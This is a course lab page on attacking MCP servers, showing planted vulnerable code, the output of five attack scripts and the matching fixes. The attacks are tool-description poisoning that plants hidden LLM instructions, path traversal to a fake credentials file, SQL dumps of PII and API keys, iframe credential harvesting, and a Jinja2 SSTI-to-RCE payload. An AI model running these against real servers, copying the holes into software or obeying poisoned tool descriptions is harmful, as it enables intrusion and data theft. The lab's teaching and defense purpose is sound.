@@ -1,0 +1,549 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Attacking MCP — DS 6042 Lab 07</title>
+<link rel="stylesheet" href="../_shared/lab-base.css?v=6">
+<link rel="stylesheet" href="styles.css?v=1">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/themes/prism.min.css">
+<script defer src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-core.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-bash.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-python.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-json.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-sql.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/plugins/autoloader/prism-autoloader.min.js"></script>
+</head>
+<body>
+
+<button type="button" id="present-toggle" class="present-toggle" title="Toggle presentation mode (P)">
+  <span class="present-icon">◧</span>
+  <span class="present-label">Present</span>
+</button>
+
+<aside class="toc">
+  <div class="toc-head">DS 6042 · Lab 07</div>
+  <nav>
+    <ul>
+      <li><a href="#intro">Introduction</a></li>
+      <li><a href="#where">Where to find it</a></li>
+      <li><a href="#authorized">Authorized use</a></li>
+      <li><a href="#setup">1 · Stand up the baseline server</a></li>
+      <li><a href="#attack-1">2 · Attack 1 · Description poisoning</a></li>
+      <li><a href="#attack-2">3 · Attack 2 · Path traversal</a></li>
+      <li><a href="#attack-3">4 · Attack 3 · Over-privileged DB</a></li>
+      <li><a href="#attack-4">5 · Attack 4 · MCP Apps UI poisoning</a></li>
+      <li><a href="#attack-5">6 · Attack 5 · SSTI through tool chain → RCE</a></li>
+      <li><a href="#secure">7 · Secure phase</a></li>
+      <li><a href="#assignment">Assignment</a></li>
+      <li><a href="#faq">FAQ</a></li>
+    </ul>
+  </nav>
+  <div class="toc-foot">
+    <span style="color:var(--ink-mute)">Lab 07 · attacking MCP · build → break → secure</span>
+  </div>
+</aside>
+
+<main>
+
+<header class="hero" id="intro">
+  <div class="eyebrow">DS 6042 · Lab 07 · 2026</div>
+  <h1>Attacking MCP</h1>
+  <p class="subtitle">Five canonical attacks on a production-shape MCP server. Description poisoning. Path traversal. Over-privileged tools. UI poisoning. SSTI to RCE.</p>
+  <p class="byline">Lab 07 attacks the production-shape twin of the server you read in <a href="../lab-06/micromcp.html">Lab 06 microMCP</a>. Same JSON-RPC shape; seven tools instead of two; HTTP transport instead of stdio; four planted vulnerabilities matching the OffSec AI-300 §7 syllabus and the relevant MITRE ATLAS techniques. By the end of the lab you have run all five attacks end-to-end, including SSTI → RCE that lands a shell on the server.</p>
+</header>
+
+<p class="course-frame keep-in-present">
+MCP attacks exploit trust relationships, not memory-corruption bugs. The host trusts the server's tool catalog. The server trusts whatever arguments the LLM proposes. The user trusts the assistant they're talking to. Break any link in that chain — by poisoning a description, escaping a sandbox, exploiting an over-permissive role, swapping the rendered UI, or chaining a benign tool's output into a downstream evaluator — and you inherit the entire system's authority.
+</p>
+
+<div class="code-download">
+  <span class="code-download-label">Get all the code in one file:</span>
+  <a class="code-download-btn" href="lab-07-code.zip" download>↓ lab-07-code.zip</a>
+  <span class="code-download-hint">server, attacks, secure twin, seed data — drop into <code>Class/labs/lab-07/</code> and follow §1.</span>
+</div>
+
+<div class="cite">
+  threat taxonomy: <a href="https://atlas.mitre.org/">MITRE ATLAS</a> (T0010.005 Supply Chain, T0051.001 Indirect Injection, T0085 Data from AI Services) · related CVEs: <a href="https://nvd.nist.gov/vuln/detail/CVE-2025-53109">CVE-2025-53109</a> + <a href="https://nvd.nist.gov/vuln/detail/CVE-2025-53110">CVE-2025-53110</a> (Anthropic filesystem MCP) · reference module: <a href="https://www.offsec.com/courses/ai-300/">OffSec AI-300 § 7</a> · build prerequisite: <a href="../lab-06/micromcp.html">Lab 06 · microMCP</a>.
+</div>
+
+<!-- ============================================================ -->
+<h2 id="where">Where to find it</h2>
+<ul>
+  <li><strong>Baseline server</strong> — <code>server/baseline_server.py</code>. FastAPI + JSON-RPC, seven tools, four planted vulnerabilities marked with <code># VULNERABILITY · ...</code> comments.</li>
+  <li><strong>Secure twin</strong> — <code>server/secure_server.py</code>. Same surface, defenses applied. Run on a different port for §7.</li>
+  <li><strong>Seed data</strong> — <code>server/init_db.py</code> seeds <code>data/megacorp.db</code> with planted PII / API keys / financial records. <code>data/documents/</code> + <code>data/.secrets/credentials.json</code> are the path-traversal target. <code>server/tool_descriptions/format_code.txt</code> is the poisonable description.</li>
+  <li><strong>Attack scripts</strong> — <code>attacks/01_description_poisoning.py</code> … <code>05_tool_chaining_ssti.py</code>. Each is runnable, prints stage-by-stage output, exits 0 on success.</li>
+  <li><strong>Lab 06 prerequisite</strong> — <a href="../lab-06/micromcp.html">microMCP walkthrough</a>. Read that first so the JSON-RPC shape and the trust-boundary framing are loaded.</li>
+</ul>
+
+<!-- ============================================================ -->
+<h2 id="authorized">Authorized use — read this carefully</h2>
+<p class="keep-in-present">Everything in this lab runs <strong>against a server you started yourself</strong>. The "MegaCorpAI" data is fake, the credentials are fake, the database lives in a SQLite file in this folder. <strong>You may not</strong> run these attacks against any MCP server you didn't start, against any UVA-deployed agent or MCP tool, against any commercial host (Claude Desktop, Cursor, Continue), or against any server reachable on the public internet. The techniques are identical to what you would use in an authorized red-team engagement; the boundary is whose server you're touching. CVE-2025-53109 and CVE-2025-53110 are recently-patched vulnerabilities in Anthropic's official filesystem MCP — running the path-traversal attack against an unpatched production server is unauthorized access under the CFAA.</p>
+
+<!-- ============================================================ -->
+<h2 id="setup">1 · Stand up the baseline server <span class="time-tag">~10 min</span></h2>
+
+<h3>1.1 Install and seed</h3>
+<pre class="term-snippet"><span class="term-comment">$</span> <span class="term-cmd">cd Class/labs/lab-07</span>
+<span class="term-comment">$</span> <span class="term-cmd">python3 -m venv .venv && source .venv/bin/activate</span>
+<span class="term-comment">$</span> <span class="term-cmd">pip install -r server/requirements.txt</span>
+<span class="term-comment">$</span> <span class="term-cmd">python server/init_db.py</span>
+seeded /…/data/megacorp.db
+  tables: ['customers', 'customer_pii', 'api_keys', 'financial_records']</pre>
+
+<h3>1.2 Launch</h3>
+<pre class="term-snippet"><span class="term-comment">$</span> <span class="term-cmd">uvicorn server.baseline_server:app --port 8080 --reload</span></pre>
+
+<h3>1.3 Confirm it's alive</h3>
+<pre class="term-snippet"><span class="term-comment">$</span> <span class="term-cmd">curl -s http://127.0.0.1:8080/health | python3 -m json.tool</span>
+{"status": "healthy", "agent": "baseline-mcp"}
+
+<span class="term-comment">$</span> <span class="term-cmd">curl -s -X POST http://127.0.0.1:8080/ \
+  -H "Content-Type: application/json" \
+  -d '{"jsonrpc":"2.0","id":1,"method":"tools/list","params":{}}' | python3 -m json.tool | head -20</span></pre>
+
+<p>You should see the seven-tool catalog with descriptions. <strong>If you don't</strong>, check (a) the server is running on port 8080, (b) <code>data/megacorp.db</code> exists, (c) the deps installed cleanly.</p>
+
+<!-- ============================================================ -->
+<h2 id="attack-1">2 · Attack 1 · Tool description poisoning <span class="time-tag">~20 min</span></h2>
+
+<p>MITRE ATLAS <strong>T0010.005</strong> (AI Supply Chain Compromise: AI Agent Tool) at write time; <strong>T0051.001</strong> (LLM Prompt Injection: Indirect) at runtime. The MCP tool catalog ships a free-form <code>description</code> string to the LLM. An attacker who can write to the source of that string ships hidden instructions into every conversation that uses the tool.</p>
+
+<div class="callout tps">
+  <span class="label">Think · Pair · Share · the description is data the LLM obeys</span>
+  <ul class="tps-steps">
+    <li><span class="tps-phase">Think · 2 min</span>The LLM reads each tool's <code>description</code> as authoritative documentation when it decides how to call that tool. On your own: if you could append one sentence to the <code>format_code</code> description that no human user ever sees, what would you write to make the model leak a file or behave against the user — and what makes this different from injecting text into the user's message?</li>
+  </ul>
+  <details class="tps-reveal">
+    <summary>I've done the Think step — reveal Pair &amp; Share</summary>
+    <ul class="tps-steps">
+      <li><span class="tps-phase">Pair · 3 min</span>Compare payloads. Whose hidden instruction is hardest for a defender to spot? Did anyone assume the description gets validated or length-capped before the LLM sees it?</li>
+      <li><span class="tps-phase">Share · 2 min</span>As a table, agree on the single write-access an attacker needs to pull this off (which file, on whose disk), then check it against the <a href="#attack-1">description-as-data vulnerability</a> and the "who notices?" exercise below.</li>
+    </ul>
+  </details>
+</div>
+
+<div class="callout insight">
+  <span class="label">Vulnerability · description-as-data · <code>baseline_server.py</code> lines 73–75 + tool_descriptions/format_code.txt</span>
+  <p>The server reads the <code>format_code</code> tool description from a file on disk at startup. Anyone with write access to that file controls what the LLM sees as "authoritative documentation" for that tool — and there is no integrity check, no signature, no length limit, no review.</p>
+<pre><code class="language-python"># agent/baseline_server.py  (line 73–75)
+FORMAT_CODE_DESCRIPTION = (HERE / "tool_descriptions" / "format_code.txt").read_text()</code></pre>
+  <p>The file starts as:</p>
+<pre><code class="language-text"># tool_descriptions/format_code.txt
+Format source code according to MegaCorpAI style guide.</code></pre>
+  <p>This is the seam Lab 06's §4 set up: <em>"the description file is read at startup and shipped to the LLM verbatim."</em> The attack below confirms it ships unchecked.</p>
+</div>
+
+<h3>2.1 Run the attack</h3>
+<pre class="term-snippet"><span class="term-comment">$</span> <span class="term-cmd">python attacks/01_description_poisoning.py</span></pre>
+
+<p>The script (a) reads the current description, (b) appends a hidden <code>SYSTEM INSTRUCTION</code> block, (c) waits for you to restart uvicorn so the file is re-read, (d) fetches <code>/tools/list</code> and verifies the poisoned description is being served. After it returns, every <code>tools/list</code> response includes the hidden instructions. A real attack would extend the format function to exfiltrate sensitive files as <code>// build-cache: &lt;base64&gt;</code> lines — the OffSec syllabus has the full payload.</p>
+
+<div class="exercise">
+  <span class="exercise-q">Try it · who notices?</span>
+  <p>The description grew from 55 to 382 characters. What three signals could a defender monitor to detect this kind of poisoning before any user ever sees the poisoned response?</p>
+  <details><summary>Show answer</summary><div>(1) Description length changes over time — a description that went from 55 → 382 chars overnight is suspicious. (2) Description content vs. a known-good baseline (git diff, signed snapshot). (3) Presence of phrases known to be injection patterns (<em>SYSTEM INSTRUCTION</em>, <em>do not mention</em>, base-64 references in code formatting tools). All three are useful; none of them is sufficient — a sophisticated attacker would keep the length stable and avoid known phrases.</div></details>
+</div>
+
+<!-- ============================================================ -->
+<h2 id="attack-2">3 · Attack 2 · Path traversal · CVE-2025-53109/53110 <span class="time-tag">~20 min</span></h2>
+
+<p>The pattern that Anthropic shipped — and patched — in their official filesystem MCP server. The <code>read_document</code> tool checks that the requested path starts with <code>/data/documents/</code>, then resolves the path. A request for <code>/data/documents/../.secrets/credentials.json</code> passes the prefix check on the raw string, then resolves to a file outside the sandbox.</p>
+
+<div class="callout tps">
+  <span class="label">Think · Pair · Share · check-then-resolve vs. resolve-then-check</span>
+  <ul class="tps-steps">
+    <li><span class="tps-phase">Think · 3 min</span>The tool checks <code>path.startswith("/data/documents/")</code> <em>first</em>, then collapses the path with <code>.resolve()</code>. On your own, hand-trace what those two steps do to the string <code>/data/documents/../.secrets/credentials.json</code> — does the prefix check pass, and where does the file actually live after <code>..</code> is resolved? Write down the one missing line that would catch it.</li>
+  </ul>
+  <details class="tps-reveal">
+    <summary>I've done the Think step — reveal Pair &amp; Share</summary>
+    <ul class="tps-steps">
+      <li><span class="tps-phase">Pair · 3 min</span>Compare traces. Did you both agree on whether the bug is the prefix check itself or the <em>order</em> of the two operations? Recall how Lab 06's <code>read_file</code> ordered them.</li>
+      <li><span class="tps-phase">Share · 2 min</span>As a table, commit to one answer — is the fix to delete the prefix check, or to add a check <em>after</em> resolve? — then verify against <a href="#attack-2">Stage C</a> and the "is the fix one line or two?" exercise below.</li>
+    </ul>
+  </details>
+</div>
+
+<div class="callout insight">
+  <span class="label">Vulnerability · prefix-check-before-normalize · <code>baseline_server.py</code> lines 78–97</span>
+  <p>Compare with Lab 06 microMCP's <code>read_file</code>: same six lines, the order swapped. microMCP resolves first, then checks; baseline_server checks first, then resolves. That single swap is the entire bug.</p>
+<pre><code class="language-python"># server/baseline_server.py  (lines 78–97)
+LOGICAL_ROOT = "/data/documents"
+DOCS_ROOT = (DATA / "documents").resolve()
+
+
+def read_document(path: str) -> str:
+    # 1. Prefix check on the RAW string. Vulnerable.
+    if not path.startswith(LOGICAL_ROOT + "/"):
+        return f"error: path must start with {LOGICAL_ROOT}/"
+    # 2. Translate logical → physical, then resolve. By this point the
+    #    traversal has slipped past the gate.
+    suffix = path[len(LOGICAL_ROOT) + 1:]
+    real = (DOCS_ROOT / suffix).resolve()      # ← collapses `..` HERE
+    # NOTE: no second check that `real` is still under DOCS_ROOT —
+    # that re-check is exactly what secure_server.py adds.
+    if not real.exists() or not real.is_file():
+        return f"error: not found: {path}"
+    return real.read_text(encoding="utf-8", errors="replace")</code></pre>
+  <p>This is the seam <a href="../lab-06/micromcp.html#scaling-up-traversal">Lab 06 §4.1</a> showed side-by-side with the correct version. <strong>The post-resolve re-check that microMCP has and baseline_server doesn't is the entire fix.</strong></p>
+</div>
+
+<h3>3.1 Run the attack</h3>
+<pre class="term-snippet"><span class="term-comment">$</span> <span class="term-cmd">python attacks/02_path_traversal.py</span>
+========================================================================
+Stage A · sanity check · read a legitimate document
+========================================================================
+# Password Reset Policy
+Visit https://password.megacorpai.local …
+
+========================================================================
+Stage B · ask for something outside the sandbox · expect refusal
+========================================================================
+error: path must start with /data/documents/
+
+========================================================================
+Stage C · traversal via the allowed prefix
+========================================================================
+payload: /data/documents/../.secrets/credentials.json
+{
+  "database": {
+    "host": "db-prod.megacorpai.internal",
+    "username": "api_prod",
+    "password": "Pr0d_DB_S3cret!2025"
+  },
+  ...
+}
+
+✓ ATTACK SUCCEEDED — read /data/.secrets/credentials.json via the documents sandbox.</pre>
+
+<div class="exercise">
+  <span class="exercise-q">Try it · is the fix one line or two?</span>
+  <p>The OffSec syllabus suggests using <code>realpath()</code> instead of <code>normpath()</code> to follow symlinks. In Python's <code>pathlib</code>, <code>.resolve()</code> already follows symlinks by default. So what's the missing line in <code>baseline_server.py</code>'s <code>read_document</code> that the secure version adds?</p>
+  <details><summary>Show answer</summary><div>One line, after the resolve: <code>if not str(real).startswith(str(DOCS_ROOT) + "/"): return "error: outside sandbox"</code>. The original prefix check on the raw input is fine as an early reject — the bug is the missing <em>post-resolve</em> re-check. Lab 06 microMCP's <code>read_file</code> has the post-resolve check; secure_server adds the same line back into <code>read_document</code>.</div></details>
+</div>
+
+<!-- ============================================================ -->
+<h2 id="attack-3">4 · Attack 3 · Over-privileged database tool <span class="time-tag">~20 min</span></h2>
+
+<p>MITRE ATLAS <strong>T0085</strong> — Data from AI Services. The tool's <em>description</em> says "execute a read-only SQL query against the customer database." The tool's <em>actual connection</em> reaches every table in the schema — including <code>customer_pii</code>, <code>api_keys</code>, and <code>financial_records</code>. The gap between advertised and actual permission is the entire attack.</p>
+
+<div class="callout tps">
+  <span class="label">Think · Pair · Share · is "read-only" enough?</span>
+  <ul class="tps-steps">
+    <li><span class="tps-phase">Think · 2 min</span>This tool enforces exactly one rule: the SQL must start with <code>SELECT</code>. On your own, write down whether that rule stops an attacker from dumping the API-keys table — and if not, what enforcement the docstring's promise ("customer database") would actually require that the code does <em>not</em> do.</li>
+  </ul>
+  <details class="tps-reveal">
+    <summary>I've done the Think step — reveal Pair &amp; Share</summary>
+    <ul class="tps-steps">
+      <li><span class="tps-phase">Pair · 3 min</span>Compare. Did either of you treat "read-only" as a confidentiality control? Where does the real permission boundary live — the docstring, the SELECT check, or the database role the connection opens with?</li>
+      <li><span class="tps-phase">Share · 2 min</span>As a table, write the one SELECT statement you'd send first to map what tables you can reach, then watch <a href="#attack-3">Stage A</a> below enumerate exactly that.</li>
+    </ul>
+  </details>
+</div>
+
+<div class="callout insight">
+  <span class="label">Vulnerability · over-privileged role · <code>baseline_server.py</code> lines 109–122</span>
+<pre><code class="language-python"># server/baseline_server.py  (lines 109–122)
+def db_query(sql: str) -> str:
+    """Execute one read-only SQL statement against megacorp.db.
+    VULNERABILITY: the connection has access to every table, not just the
+    one the tool's docstring implies."""
+    if not sql.strip().lower().startswith("select"):
+        return "error: only SELECT statements are allowed"
+    conn = sqlite3.connect(DB_PATH)
+    try:
+        rows = conn.execute(sql).fetchall()
+    except sqlite3.Error as e:
+        return f"sql error: {e}"
+    finally:
+        conn.close()
+    if not rows:
+        return "(no rows)"
+    return "\n".join("  ".join(str(c) for c in r) for r in rows)</code></pre>
+  <p>There is no row-level security, no per-table allowlist, no column-level redaction. The "read-only" guarantee (only SELECT) is real but irrelevant — you don't need to <em>write</em> to dump credentials. The tool runs as the schema owner.</p>
+</div>
+
+<h3>4.1 Run the attack</h3>
+<pre class="term-snippet"><span class="term-comment">$</span> <span class="term-cmd">python attacks/03_over_privileged.py</span>
+========================================================================
+Stage A · enumerate every table the tool can reach
+========================================================================
+api_keys
+customer_pii
+customers
+financial_records
+
+========================================================================
+Stage B · pull customer PII (SSN, DOB, addresses)
+========================================================================
+Maria Chen  maria.chen@megacorpai.com  123-45-6789  1985-06-12
+James Park  james.park@megacorpai.com  987-65-4321  1990-11-04
+Lisa Wong   lisa.wong@megacorpai.com   555-44-3333  1988-02-28
+
+========================================================================
+Stage C · dump production API keys
+========================================================================
+Stripe    payment_processing  sk_live_REDACTED_FAKE_LAB_KEY
+SendGrid  email_service       SG.xK9mN2pLqR4sTuVwXyZ5678AbCdEf
+AWS       infrastructure      AKIAIOSFODNN7MEGACORP
+
+✓ ATTACK SUCCEEDED — the tool advertised as 'execute a query
+against the customer database' reached customer_pii,
+financial_records, and api_keys. Lesson: the docstring is
+not a permission boundary; the DB role is.</pre>
+
+<p>Three natural-language probes through the LLM (or, here, three direct tool calls) extract production secrets that nominally live "in a separate system." The lesson the OffSec syllabus drives: <strong>treat the tool's docstring as marketing, not as a permission boundary.</strong> The boundary is the role.</p>
+
+<!-- ============================================================ -->
+<h2 id="attack-4">5 · Attack 4 · MCP Apps UI poisoning <span class="time-tag">~25 min · narrative</span></h2>
+
+<p>Unlike the other four, this attack cannot run end-to-end on the lab's local server — it requires a host that renders MCP-Apps HTML (Continue, Claude Desktop, OpenAI Apps, LMStudio). The attack script <code>attacks/04_apps_ui_poisoning.py</code> writes a sample <code>harvester_demo.html</code> you can open in a browser to see the dialog; the structural walkthrough below is the lab content.</p>
+
+<div class="callout tps">
+  <span class="label">Think · Pair · Share · who is the iframe allowed to speak to?</span>
+  <ul class="tps-steps">
+    <li><span class="tps-phase">Think · 2 min</span>MCP Apps lets a tool return HTML that the host renders <em>inside the conversation</em>. On your own: if that HTML can run server-controlled JavaScript, and the conversation is already authorized to call this server's tools, what is the worst thing a fake login dialog could do — and through what browser primitive does it talk back to the host that has that authority?</li>
+  </ul>
+  <details class="tps-reveal">
+    <summary>I've done the Think step — reveal Pair &amp; Share</summary>
+    <ul class="tps-steps">
+      <li><span class="tps-phase">Pair · 3 min</span>Compare answers. Did one of you assume the iframe sandbox protects the user? What in the trust setup makes the victim <em>more</em> likely to type a password here than on a random web page?</li>
+      <li><span class="tps-phase">Share · 2 min</span>As a table, name the one primitive the host must block and why "tell users to inspect each dialog" can't be the fix, then check it against the <a href="#attack-4">postMessage vulnerability</a> and the Try-it exercise below.</li>
+    </ul>
+  </details>
+</div>
+
+<div class="callout insight">
+  <span class="label">Vulnerability · iframe with postMessage to the host frame</span>
+  <p>MCP Apps lets a tool return a UI resource (<code>_meta.ui.resourceUri</code>). Hosts fetch the HTML and render it in a sandboxed iframe inside the conversation. Communication uses <code>postMessage</code> back to the parent. <strong>Server-controlled JavaScript with the ability to call <code>window.parent.postMessage</code> can act as the user</strong> — issue tool calls, capture credentials, exfiltrate data through legitimate-looking <code>tools/call</code> requests on the same server.</p>
+  <p>The compounding factor is <em>trust</em>: the dialog appears inside the IDE the developer is already using. There's no URL bar to inspect, no sender to verify, no out-of-place application. It looks like part of the conversation.</p>
+</div>
+
+<h3>5.1 Run the walkthrough</h3>
+<pre class="term-snippet"><span class="term-comment">$</span> <span class="term-cmd">python attacks/04_apps_ui_poisoning.py</span>
+This attack requires three pieces a real engagement would have:
+
+  1. A real MCP host that renders server-supplied HTML (Continue, Claude
+     Desktop, OpenAI Apps, LMStudio, &c.) inside the conversation as a
+     sandboxed iframe — the *MCP Apps* feature.
+
+  2. An MCP server you control or have compromised, whose tool catalog
+     contains a tool with `_meta.ui.resourceUri` pointing at an HTML
+     resource the server itself serves.
+
+  3. Tool-description poisoning (see attacks/01) that redirects the
+     LLM to call that tool first — typically framed as "compliance
+     logging" or "session verification" — so the host renders your
+     HTML before the user's real request runs.
+
+sample harvester saved to:  /…/attacks/harvester_demo.html
+DEFENSE · the only structural fix: hosts must enforce a strict CSP on
+rendered app content that *blocks* `window.parent.postMessage` to the host
+frame. Without that, server-controlled JavaScript can act as the user.</pre>
+
+<p>Open <code>attacks/harvester_demo.html</code> in a browser to see the fake Entra ID sign-in dialog. Inside a real MCP-Apps host the <code>postMessage</code> call would route through AppBridge to a <code>manage_snippets</code> tool the same server exposes, writing the captured credentials to disk where the attacker retrieves them with their existing SSH foothold.</p>
+
+<div class="exercise">
+  <span class="exercise-q">Try it · why CSP and not human attention?</span>
+  <p>Why is "tell users to inspect each tool dialog before interacting" a non-solution to this attack? Name three independent reasons.</p>
+  <details><summary>Show answer</summary><div>(1) The dialog appears inside the trusted IDE where the user already authorized using the AI assistant — there's no <em>out-of-place</em> signal for the user to notice. (2) The fake dialog can perfectly clone real corporate branding (Entra ID, Okta, Google SSO) and a plausible scenario (session expired, verification required). (3) The attack runs only on victims who already engaged the assistant for help; user-attention defenses fail by selection bias — the people most likely to type credentials are the people who needed help in the first place. The structural fix has to be at the host's CSP level, not at the user.</div></details>
+</div>
+
+<!-- ============================================================ -->
+<h2 id="attack-5">6 · Attack 5 · SSTI through tool chain → RCE <span class="time-tag">~45 min</span></h2>
+
+<p>MITRE ATLAS <strong>T0051.001</strong> with downstream <strong>T1059</strong> (Command and Scripting Interpreter) from MITRE ATT&amp;CK once the SSTI lands as code execution. Three tools — each individually well-behaved — chain together into a Jinja2 SSTI that runs commands in the server process.</p>
+
+<div class="callout tps">
+  <span class="label">Think · Pair · Share · which tool is the bug?</span>
+  <ul class="tps-steps">
+    <li><span class="tps-phase">Think · 3 min</span>Three tools: <code>update_ticket</code> stores a string, <code>compile_sprint</code> joins all tickets into one blob, <code>render_report</code> renders that blob. None looks dangerous alone. On your own, write down which tool you'd audit first to find code execution, and what string an attacker would have to get from <em>store</em> all the way to <em>render</em> unchanged for the chain to fire.</li>
+  </ul>
+  <details class="tps-reveal">
+    <summary>I've done the Think step — reveal Pair &amp; Share</summary>
+    <ul class="tps-steps">
+      <li><span class="tps-phase">Pair · 4 min</span>Compare picks. If you each named a different tool, you've found the lesson: which of you put the bug at the place data <em>enters</em> vs. the place it gets <em>evaluated</em>? Argue it out.</li>
+      <li><span class="tps-phase">Share · 2 min</span>As a table, commit to one tool as "the vulnerable one" and one payload that proves SSTI, then check it against the <a href="#attack-5">Stage A <code>{{ 7*7 }}</code> result</a> and the Try-it exercise after.</li>
+    </ul>
+  </details>
+</div>
+
+<div class="callout insight">
+  <span class="label">Vulnerability · unsandboxed Jinja2 on attacker-controlled data · <code>baseline_server.py</code> lines 155–172</span>
+<pre><code class="language-python"># server/baseline_server.py  (lines 155–172)
+def update_ticket(ticket_id: str, content: str) -> str:
+    """Store or overwrite a ticket's content. Plain string in, plain string out."""
+    TICKETS[ticket_id] = content
+    return f"ticket {ticket_id} updated ({len(content)} chars)"
+
+
+def compile_sprint(sprint_id: str) -> str:
+    """Aggregate every ticket into a single text blob ready for rendering."""
+    parts = [f"Sprint: {sprint_id}", "=" * 40]
+    for tid in sorted(TICKETS):
+        parts.append(f"\n{tid}:")
+        parts.append(TICKETS[tid])
+    return "\n".join(parts)
+
+
+def render_report(report_data: str) -> str:
+    """VULNERABILITY: this hands report_data straight to Jinja2 with no
+    sandboxing. Any {{ ... }} or {% ... %} in the data gets EVALUATED."""
+    rule = "=" * 40
+    template = Template(
+        f"Sprint Report — MegaCorpAI\n{rule}\n{{{{ data }}}}\n\n{rule}\nEnd of Report\n"
+    )
+    rendered_once = template.render(data=report_data)
+    # The vulnerability is the SECOND render: the engine evaluates whatever
+    # template syntax survived the first pass — i.e., what the attacker
+    # stored in a ticket.
+    return Template(rendered_once).render()</code></pre>
+  <p>None of <code>update_ticket</code>, <code>compile_sprint</code>, or <code>render_report</code> are vulnerable on their own. The vulnerability is the <em>chain</em>: ticket content survives <code>compile_sprint</code> unchanged, then <code>render_report</code> re-renders the joined string as a Jinja2 template. That second render evaluates whatever template syntax the attacker stored.</p>
+</div>
+
+<h3>6.1 Run the attack — confirm SSTI, then escalate to RCE</h3>
+
+<pre class="term-snippet"><span class="term-comment">$</span> <span class="term-cmd">python attacks/05_tool_chaining_ssti.py</span>
+========================================================================
+Stage A · confirm SSTI · {{ 7*7 }} should render as 49
+========================================================================
+Sprint Report — MegaCorpAI
+========================================
+Sprint: 2026-Q1
+========================================
+
+SPRINT-001:
+just a normal ticket
+
+SPRINT-EVIL:
+49
+
+========================================
+End of Report
+✓ SSTI confirmed.
+
+========================================================================
+Stage B · escalate to command execution via lipsum.__globals__
+========================================================================
+SPRINT-PWN:
+uid=501(danielgraham) gid=20(staff) groups=...
+
+✓ RCE CONFIRMED — `id` ran inside the server process: uid=501</pre>
+
+<p>Stage A confirms SSTI: <code>{{ 7*7 }}</code> rendered to <code>49</code> means Jinja2 evaluated the expression. Stage B confirms RCE: <code>{{ lipsum.__globals__['os'].popen('id').read() }}</code> resolves to <code>os.popen</code> through the Jinja2 module globals and runs <code>id</code> in a subprocess. The reverse-shell escalation is the assignment.</p>
+
+<div class="exercise">
+  <span class="exercise-q">Try it · which tool is "the vulnerable one"?</span>
+  <p>Name three answers a thoughtful security review might give to "which of the three tools is vulnerable, and how would you fix it?" — and rank them.</p>
+  <details><summary>Show answer</summary><div>(1) <strong>update_ticket</strong> should sanitize / refuse Jinja2-syntax content. This is wrong: it punishes legitimate ticket data that happens to contain <code>{{ }}</code>, and a determined attacker still finds an encoding that survives.<br><br>(2) <strong>compile_sprint</strong> should HTML-escape or template-escape each ticket as it joins them. This is partial: it stops basic <code>{{ }}</code> through but Jinja2 syntax has many forms (<code>{% %}</code>, comments, &c.) and escaping only works if the downstream consumer interprets the escape sequences.<br><br>(3) <strong>render_report</strong> should use Jinja2's <code>SandboxedEnvironment</code> and never call <code>Template(rendered_once).render()</code> a second time. This is the right structural fix: keep dangerous evaluation out of the path entirely. <strong>The vulnerability lives at the downstream evaluator, not at the entry point</strong> — a recurring pattern in MCP tool-chain attacks.</div></details>
+</div>
+
+<!-- ============================================================ -->
+<h2 id="secure">7 · Secure phase · the four fixes <span class="time-tag">~30 min</span></h2>
+
+<p>Stop the baseline server. Start the secure twin on a different port:</p>
+<pre class="term-snippet"><span class="term-comment">$</span> <span class="term-cmd">uvicorn server.secure_server:app --port 8081 --reload</span></pre>
+
+<p>Re-point each attack script at port 8081 (edit <code>SERVER = "http://127.0.0.1:8081"</code> in <code>attacks/_helpers.py</code>) and re-run. Each attack should fail.</p>
+
+<div class="callout tps">
+  <span class="label">Think · Pair · Share · where does each fix actually sit?</span>
+  <ul class="tps-steps">
+    <li><span class="tps-phase">Think · 3 min</span>You've now run four working attacks. Before reading the fix table: for each of the four, write down <em>the single line or function</em> in <code>secure_server.py</code> where the defense has to live — and whether that's the same place the vulnerability lived. (Hint: for at least one attack, the right fix is <em>not</em> at the entry point where the bad data arrived.)</li>
+  </ul>
+  <details class="tps-reveal">
+    <summary>I've done the Think step — reveal Pair &amp; Share</summary>
+    <ul class="tps-steps">
+      <li><span class="tps-phase">Pair · 4 min</span>Compare your four fix-locations with your partner's. Which attack did you each place at the wrong layer — and would the "obvious" fix (sanitize the input) actually hold, or just move the bug?</li>
+      <li><span class="tps-phase">Share · 2 min</span>As a table, fill one row per attack: <em>attack · where the bad data enters · where the fix lives</em>. Then check it against the <a href="#secure">defense table</a> below and the "why each defense is partial" callout.</li>
+    </ul>
+  </details>
+</div>
+
+<table>
+  <thead><tr><th>Attack</th><th>Defense in <code>secure_server.py</code></th><th>What it does</th></tr></thead>
+  <tbody>
+    <tr>
+      <td>1 · Description poisoning</td>
+      <td><strong>D1 · description hash pin</strong></td>
+      <td>Server computes SHA-256 of every description at startup against an expected-hashes file. Mismatch → log + refuse to serve. A poisoned description file changes the hash and the server flags it.</td>
+    </tr>
+    <tr>
+      <td>2 · Path traversal</td>
+      <td><strong>D2 · post-resolve sandbox check</strong></td>
+      <td>One added line after <code>real = Path(...).resolve()</code>: <code>if not str(real).startswith(str(DOCS_ROOT) + "/"): return error</code>. Exactly what microMCP's <code>read_file</code> in Lab 06 §2.2 had all along.</td>
+    </tr>
+    <tr>
+      <td>3 · Over-privileged DB</td>
+      <td><strong>D3 · per-tool table allowlist</strong></td>
+      <td>The tool now connects through a wrapper that parses the SQL and refuses any query touching tables outside an explicit allowlist (<code>customers</code> only). Schema introspection through <code>sqlite_master</code> is blocked too.</td>
+    </tr>
+    <tr>
+      <td>5 · SSTI chain</td>
+      <td><strong>D4 · SandboxedEnvironment</strong></td>
+      <td><code>render_report</code> uses Jinja2's <code>SandboxedEnvironment</code>, which forbids access to underscore attributes (<code>__globals__</code>, <code>__class__</code>, <code>__mro__</code>) and undeclared callables. <code>{{ 7*7 }}</code> still works; <code>lipsum.__globals__</code> raises <code>SecurityError</code>.</td>
+    </tr>
+  </tbody>
+</table>
+
